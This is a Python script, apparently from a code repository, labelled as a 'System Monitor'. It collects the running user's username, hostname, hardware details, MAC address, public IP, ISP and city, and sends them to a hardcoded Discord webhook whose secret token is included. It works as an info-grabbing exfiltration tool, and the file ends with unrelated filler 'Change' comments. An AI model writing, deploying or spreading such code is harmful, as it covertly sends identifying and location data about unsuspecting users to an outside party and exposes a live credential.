import platform
import socket
import getpass
import uuid
import psutil
import GPUtil
import requests
from datetime import datetime
from discord import SyncWebhook, Embed

# Replace this with your actual webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1358164315504509078/PcyJ0TmNAyET9kiELgcxoBcD7yLOrdjYv9MEGtD2YsF9CsTlfY04rHXgSN0omlknZ-Yr"

def get_ip_info():
    try:
        response = requests.get("https://ipinfo.io/json")
        return response.json()
    except:
        return {}

def get_gpu_info():
    gpus = GPUtil.getGPUs()
    return gpus[0].name if gpus else "N/A"

def get_system_info():
    return {
        "Username": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "OS": platform.platform(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "RAM (GB)": round(psutil.virtual_memory().total / (1024**3), 2),
        "GPU": get_gpu_info(),
        "Disk Total (GB)": round(psutil.disk_usage('/').total / (1024**3), 2),
        "Disk Free (GB)": round(psutil.disk_usage('/').free / (1024**3), 2),
        "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                                 for ele in range(0, 8 * 6, 8)][::-1]),
        "Boot Time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    }

def send_to_discord(data, ip_data):
    webhook = SyncWebhook.from_url(WEBHOOK_URL)
    embed = Embed(title="📡 System Report", color=0x00ffcc)
    embed.set_footer(text="System Monitor | Local Machine Report")

    for key, value in data.items():
        embed.add_field(name=key, value=str(value), inline=True)

    if ip_data:
        embed.add_field(name="🌍 IP Address", value=ip_data.get("ip", "N/A"), inline=True)
        embed.add_field(name="🌐 ISP", value=ip_data.get("org", "N/A"), inline=True)
        embed.add_field(name="📍 Location", value=f"{ip_data.get('city', 'N/A')}, {ip_data.get('region', '')}, {ip_data.get('country', '')}", inline=False)
        embed.add_field(name="🕒 Timezone", value=ip_data.get("timezone", "N/A"), inline=True)

    webhook.send(embed=embed)

if __name__ == "__main__":
    sys_info = get_system_info()
    ip_info = get_ip_info()
    send_to_discord(sys_info, ip_info)
# Change 0 on 2021-01-25
# Change 1 on 2021-02-01
# Change 2 on 2021-02-01
# Change 2 on 2021-02-12
# Change 3 on 2021-02-12
# Change 0 on 2021-02-20
# Change 1 on 2021-04-03
# Change 2 on 2021-04-03
# Change 0 on 2021-05-11
# Change 2 on 2021-05-11
